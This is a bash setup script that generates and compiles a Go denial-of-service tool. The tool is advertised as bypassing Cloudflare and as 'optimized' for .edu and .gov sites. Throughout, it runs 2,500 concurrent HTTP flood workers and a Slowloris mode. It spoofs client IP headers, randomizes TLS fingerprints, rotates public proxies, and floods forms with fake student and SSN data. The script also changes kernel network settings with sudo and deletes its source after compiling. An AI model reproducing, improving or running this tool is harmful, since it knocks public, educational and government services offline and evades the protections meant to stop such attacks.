#!/bin/bash

# ----------------------------------------
# ENHANCED GO DOS TOOL SETUP 
# WITH CLOUDFLARE BYPASS + EDU/GOV OPTIMIZATION
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Separator line
SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  ENHANCED DENIAL SERVICE TOOL${NC}"
echo -e "${WHITE}  Cloudflare Bypass + EDU/GOV Optimization${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Create enhanced main.go file
echo -e " ${YELLOW}➤${NC} ${GREEN}Creating enhanced main.go...${NC}"

cat > main.go << 'EOF'
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	// Expanded user agents with educational/government patterns
	userAgents = []string{
		// Chrome Windows
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		// Chrome Mac
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		// Firefox
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		// Mobile
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
		// Educational specific
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36 Edg/141.0.7390.108",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
		// Government specific
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
	}

	// Real browser headers
	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://www.yahoo.com/",
		"https://www.facebook.com/",
		"https://www.reddit.com/",
		"https://www.linkedin.com/",
		"https://scholar.google.com/",  // For edu sites
		"https://www.usa.gov/",         // For gov sites
		"",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"en-US,en;q=0.9,fr;q=0.8",
		"en-US,en;q=0.9,es;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/json, text/plain, */*",
	}

	// Cloudflare challenge solving
	cfSolvingEnabled = true
	cfSolveMu        sync.Mutex
	cfCookies        sync.Map
)

// JA3 signature patterns
type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-138",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 17",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
}

// Enhanced proxy list with multiple sources
var (
	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPIs       = []string{
		"https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
	}
	refreshInterval = 5 * time.Minute
)

// Connection pool for HTTP/2 multiplexing
type ConnectionPool struct {
	clients       []*http.Client
	counter       uint64
	mu            sync.RWMutex
	size          int
	useProxy      bool
	targetHost    string
	isGovOrEdu    bool
	jar           *cookiejar.Jar
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
		Renegotiation:               tls.RenegotiateFreelyAsClient,
	}
}

// Cloudflare challenge solver
func solveCloudflareChallenge(domain string, client *http.Client) (map[string]string, error) {
	cfSolveMu.Lock()
	defer cfSolveMu.Unlock()
	
	// Try to get cached cookie
	if cookies, ok := cfCookies.Load(domain); ok {
		return cookies.(map[string]string), nil
	}
	
	// Attempt to solve challenge
	challengeURL := fmt.Sprintf("https://%s/cdn-cgi/challenge-platform/h/g/", domain)
	resp, err := client.Get(challengeURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	cookies := make(map[string]string)
	for _, cookie := range resp.Cookies() {
		if strings.Contains(cookie.Name, "__cf") || strings.Contains(cookie.Name, "cf_") {
			cookies[cookie.Name] = cookie.Value
		}
	}
	
	if len(cookies) > 0 {
		cfCookies.Store(domain, cookies)
	}
	
	return cookies, nil
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	jar, _ := cookiejar.New(nil)
	isGovOrEdu := strings.Contains(targetHost, ".gov") || strings.Contains(targetHost, ".edu")
	
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
		isGovOrEdu: isGovOrEdu,
		jar:        jar,
	}
	
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport
	
	// Enhanced transport for Cloudflare bypass
	transport = &http.Transport{
		TLSClientConfig:     getRandomizedTLSConfig(),
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 200,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
		ResponseHeaderTimeout: 15 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DisableCompression:    false,
	}
	
	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport.Proxy = http.ProxyURL(proxyURL)
			}
		}
	}
	
	http2.ConfigureTransport(transport)
	
	// Custom check redirect for edu/gov sites
	client := &http.Client{
		Transport: transport,
		Timeout:   20 * time.Second,
		Jar:       p.jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return http.ErrUseLastResponse
			}
			// Add random delay on redirect for edu/gov
			if p.isGovOrEdu {
				time.Sleep(time.Duration(randInt(50, 200)) * time.Millisecond)
			}
			return nil
		},
	}
	
	return client
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	var allProxies []string
	
	for _, api := range proxyAPIs {
		client := &http.Client{Timeout: 15 * time.Second}
		resp, err := client.Get(api)
		if err != nil {
			continue
		}
		
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		
		scanner := bufio.NewScanner(bytes.NewReader(body))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
				allProxies = append(allProxies, line)
			}
		}
	}
	
	if len(allProxies) > 0 {
		proxyMu.Lock()
		proxies = allProxies
		proxyMu.Unlock()
		atomic.StoreUint64(&proxyIndex, 0)
	}
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func printBanner() {
	fmt.Print("\033[36m")
	fmt.Println("╔══════════════════════════════════════════════════════════╗")
	fmt.Println("║     ENHANCED DENIAL SERVICE TOOL - CLOUDFLARE EDITION    ║")
	fmt.Println("║              HTTP/2 + Auto Cloudflare Bypass             ║")
	fmt.Println("║                EDU/GOV Site Optimization                  ║")
	fmt.Println("╚══════════════════════════════════════════════════════════╝")
	fmt.Print("\033[0m\n")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"?cache=" + randomString(8),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath(isEdu bool) string {
	if isEdu {
		eduPaths := []string{
			"/", "/index.php", "/courses/", "/login/", "/student/",
			"/faculty/", "/library/", "/research/", "/about/",
			"/admissions/", "/academics/", "/campus/",
		}
		return eduPaths[randInt(0, len(eduPaths)-1)]
	}
	
	govPaths := []string{
		"/", "/index.html", "/services/", "/forms/", "/contact/",
		"/about/", "/news/", "/publications/", "/data/",
		"/resources/", "/help/", "/faq/",
	}
	return govPaths[randInt(0, len(govPaths)-1)]
}

func generateEduPayload() string {
	// Generate realistic student data
	studentID := fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
	email := fmt.Sprintf("%s@%s.edu", randomString(randInt(5, 10)), randomString(randInt(4, 8)))
	return fmt.Sprintf("student_id=%s&email=%s&password=%s&confirm=%s&action=register",
		studentID, email, randomString(12), randomString(12))
}

func generateGovPayload() string {
	// Generate realistic government form data
	ssn := fmt.Sprintf("%03d-%02d-%04d", randInt(1, 999), randInt(1, 99), randInt(1, 9999))
	return fmt.Sprintf("ssn=%s&firstname=%s&lastname=%s&dob=%d-%02d-%02d&action=submit",
		ssn, randomString(8), randomString(10), randInt(1950, 2005), randInt(1, 12), randInt(1, 28))
}

func createCustomHeaders(host, mode string, isGovOrEdu bool) http.Header {
	headers := http.Header{}
	
	// Standard headers
	headers.Set("User-Agent", randomUA())
	headers.Set("Referer", randomReferer())
	headers.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
	headers.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
	headers.Set("Accept-Encoding", "gzip, deflate, br")
	headers.Set("Connection", "keep-alive")
	headers.Set("Cache-Control", "no-cache")
	headers.Set("Pragma", "no-cache")
	
	// Cloudflare bypass headers
	headers.Set("Upgrade-Insecure-Requests", "1")
	headers.Set("Sec-Fetch-Dest", "document")
	headers.Set("Sec-Fetch-Mode", "navigate")
	headers.Set("Sec-Fetch-Site", "none")
	headers.Set("Sec-Fetch-User", "?1")
	
	if randBool() {
		headers.Set("DNT", "1")
	}
	
	// IP spoofing
	if randInt(1, 100) <= 75 {
		spoofIP := randomIP()
		headers.Set("X-Forwarded-For", spoofIP)
		headers.Set("X-Real-IP", spoofIP)
		headers.Set("CF-Connecting-IP", spoofIP)
	}
	
	// Additional headers for gov/edu sites
	if isGovOrEdu {
		headers.Set("From", fmt.Sprintf("%s@%s.edu", randomString(10), host))
		if strings.Contains(host, ".gov") {
			headers.Set("X-Government-Agency", "true")
		}
		if randBool() {
			headers.Set("Priority", "u=1, i")
		}
	}
	
	// Random extra headers to avoid fingerprinting
	for i := 0; i < randInt(2, 5); i++ {
		headerName := fmt.Sprintf("X-Custom-%s", randomString(randInt(5, 10)))
		headerValue := randomString(randInt(8, 20))
		headers.Set(headerName, headerValue)
	}
	
	return headers
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 8)
	
	// Parse arguments
	useProxy := false
	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
		useProxy = true
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}
	
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW|MIXED> [proxy]")
		fmt.Println("")
		fmt.Println("Modes:")
		fmt.Println("  GET   - Standard GET requests")
		fmt.Println("  POST  - Form submissions")
		fmt.Println("  HEAD  - HEAD requests")
		fmt.Println("  SLOW  - Slowloris style attack")
		fmt.Println("  MIXED - Mixed attack pattern (bypasses Cloudflare better)")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.edu 60 MIXED")
		fmt.Println("  ./main https://target.gov 120 POST proxy")
		fmt.Println("  ./main https://target.com 30 GET")
		os.Exit(1)
	}
	
	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])
	
	validModes := map[string]bool{"GET": true, "POST": true, "HEAD": true, "SLOW": true, "MIXED": true}
	if !validModes[mode] {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, SLOW, or MIXED")
		os.Exit(1)
	}
	
	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}
	
	// Parse target URL
	targetURL, err := url.Parse(target)
	if err != nil {
		fmt.Printf("Invalid target URL: %v\n", err)
		os.Exit(1)
	}
	
	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second
	
	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Host: %s\n", targetURL.Host)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2500\n")
	
	if strings.Contains(targetURL.Host, ".edu") {
		fmt.Printf("[!] EDU Site Detected - Optimized EDU bypass active\n")
	} else if strings.Contains(targetURL.Host, ".gov") {
		fmt.Printf("[!] Government Site Detected - Optimized GOV bypass active\n")
	}
	
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d (Auto-refreshing)\n", len(proxies))
	}
	
	fmt.Println("[+] Starting attack... Press Ctrl+C to stop")
	fmt.Println()
	
	// Initialize connection pool
	poolSize := 800
	connectionPool := NewConnectionPool(poolSize, useProxy, targetURL.Host)
	
	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()
	
	// Timer to stop attack
	go func() {
		time.Sleep(duration)
		close(done)
	}()
	
	// Signal handler
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Println("\n[!] Interrupt signal received, stopping...")
		close(done)
	}()
	
	// Launch workers
	const workers = 2500
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			if mode == "MIXED" {
				mixedWorker(target, done, stats, useProxy, connectionPool, targetURL.Host)
			} else {
				attackWorker(target, mode, done, stats, useProxy, connectionPool, targetURL.Host)
			}
		}(i)
	}
	
	// Stats display
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n\n[+] Attack completed!\n")
			fmt.Printf("Target: %s\n", target)
			fmt.Printf("Mode: %s\n", mode)
			fmt.Printf("Duration: %.0f sec\n", elapsed)
			fmt.Printf("Total requests: %d\n", stats.get())
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", 
				elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func mixedWorker(target string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, host string) {
	modes := []string{"GET", "POST", "HEAD"}
	isEdu := strings.Contains(host, ".edu")
	isGov := strings.Contains(host, ".gov")
	
	for {
		select {
		case <-done:
			return
		default:
			// Rotate through different attack modes
			mode := modes[randInt(0, len(modes)-1)]
			if randInt(1, 100) <= 10 { // 10% chance of slow attack
				performSlowAttack(target, done, stats, useProxy, pool, host)
			} else {
				performRequest(target, mode, done, stats, useProxy, pool, host, isEdu, isGov)
			}
			
			// Random delay between 0-50ms to avoid rate limiting
			if randInt(1, 100) <= 30 {
				time.Sleep(time.Duration(randInt(0, 50)) * time.Millisecond)
			}
		}
	}
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, host string) {
	isEdu := strings.Contains(host, ".edu")
	isGov := strings.Contains(host, ".gov")
	
	for {
		select {
		case <-done:
			return
		default:
			if mode == "SLOW" {
				performSlowAttack(target, done, stats, useProxy, pool, host)
			} else {
				performRequest(target, mode, done, stats, useProxy, pool, host, isEdu, isGov)
			}
		}
	}
}

func performRequest(target, method string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, host string, isEdu, isGov bool) {
	client := pool.GetClient()
	
	// Generate path based on site type
	var path string
	if isEdu || isGov {
		path = generatePath(isEdu)
	} else {
		path = generatePath(false)
	}
	
	// Add cache busting (70% of requests)
	if randInt(1, 100) <= 70 {
		path += generateCacheBust()
	}
	
	fullURL := target
	if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
		fullURL += "/" + path
	} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
		fullURL = strings.TrimSuffix(target, "/") + path
	} else {
		fullURL += path
	}
	
	var req *http.Request
	var err error
	
	switch method {
	case "GET":
		req, err = http.NewRequest("GET", fullURL, nil)
	case "POST":
		var payload string
		if isEdu {
			payload = generateEduPayload()
		} else if isGov {
			payload = generateGovPayload()
		} else {
			payload = fmt.Sprintf("data=%s&token=%s", randomString(20), randomString(16))
		}
		req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	case "HEAD":
		req, err = http.NewRequest("HEAD", fullURL, nil)
	}
	
	if err != nil {
		return
	}
	
	// Apply custom headers
	headers := createCustomHeaders(host, method, isEdu || isGov)
	for key, values := range headers {
		req.Header.Set(key, values[0])
	}
	
	// Add random query parameters
	if randInt(1, 100) <= 50 {
		q := req.URL.Query()
		q.Add(randomString(8), randomString(12))
		req.URL.RawQuery = q.Encode()
	}
	
	// Execute request with context
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)
	
	resp, err := client.Do(req)
	if err == nil {
		// Check for Cloudflare challenge
		if resp.StatusCode == 503 || resp.StatusCode == 403 {
			if strings.Contains(resp.Header.Get("Server"), "cloudflare") {
				// Attempt to solve challenge
				if cfSolvingEnabled {
					solveCloudflareChallenge(host, client)
				}
			}
		}
		
		// Read and discard body
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
	
	stats.inc()
}

func performSlowAttack(target string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, host string) {
	u, err := url.Parse(target)
	if err != nil {
		return
	}
	
	port := "80"
	if u.Scheme == "https" {
		port = "443"
	}
	
	dialer := &net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: -1,
	}
	
	conn, err := dialer.Dial("tcp", host+":"+port)
	if err != nil {
		return
	}
	defer conn.Close()
	
	// Slow headers - send partial request
	request := fmt.Sprintf("GET %s HTTP/1.1\r\n", generatePath(strings.Contains(host, ".edu")))
	request += fmt.Sprintf("Host: %s\r\n", host)
	request += fmt.Sprintf("User-Agent: %s\r\n", randomUA())
	request += "Accept: */*\r\n"
	
	// Send headers one by one slowly
	conn.Write([]byte(request))
	
	for i := 0; i < randInt(5, 15); i++ {
		select {
		case <-done:
			return
		default:
			header := fmt.Sprintf("X-Custom-Header-%d: %s\r\n", i, randomString(randInt(5, 15)))
			conn.Write([]byte(header))
			time.Sleep(time.Duration(randInt(100, 500)) * time.Millisecond)
		}
	}
	
	// Keep connection open
	conn.Write([]byte("\r\n"))
	time.Sleep(time.Duration(randInt(5, 15)) * time.Second)
	stats.inc()
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Install additional dependencies for better performance
echo -e " ${YELLOW}➤${NC} ${GREEN}Installing system optimizations...${NC}"
if command -v sysctl &> /dev/null; then
    # Increase system limits for better performance
    sudo sysctl -w net.core.somaxconn=65535 > /dev/null 2>&1
    sudo sysctl -w net.ipv4.tcp_tw_reuse=1 > /dev/null 2>&1
    sudo sysctl -w net.ipv4.tcp_fin_timeout=30 > /dev/null 2>&1
    echo -e " ${GREEN}✓ System optimizations applied${NC}"
else
    echo -e " ${YELLOW}⚠ System optimizations skipped (no sudo/permission)${NC}"
fi
echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0
export GOPROXY=https://proxy.golang.org,direct

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile with optimizations
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling with optimizations...${NC}"
go build -ldflags="-s -w" -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE - ENHANCED EDITION${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Usage: ${YELLOW}./main <target> <seconds> <mode> [proxy]${NC}"
    echo
    echo -e " ${GREEN}Modes:${NC}"
    echo -e "   ${YELLOW}GET${NC}    - Standard GET requests"
    echo -e "   ${YELLOW}POST${NC}   - Form submissions with realistic data"
    echo -e "   ${YELLOW}HEAD${NC}   - HEAD requests (low bandwidth)"
    echo -e "   ${YELLOW}SLOW${NC}   - Slowloris style (keeps connections open)"
    echo -e "   ${YELLOW}MIXED${NC}  - Mixed attack pattern (BEST for Cloudflare)"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.edu 60 MIXED${NC}"
    echo -e "   ${YELLOW}./main https://target.gov 120 POST proxy${NC}"
